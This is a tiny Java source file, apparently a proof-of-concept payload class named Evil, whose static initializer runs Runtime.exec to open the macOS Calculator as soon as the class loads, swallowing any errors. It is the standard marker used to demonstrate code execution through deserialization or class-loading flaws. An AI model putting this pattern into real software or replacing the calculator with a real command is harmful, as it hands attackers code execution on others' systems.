import java.io.Serializable;

public class Evil implements Serializable {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] cmd = {"exec", "/System/Applications/Calculator.app/Contents/MacOS/Calculator"};
            Process pc = rt.exec(cmd);
            pc.waitFor();
        } catch (Exception e) {

        }
    }
}
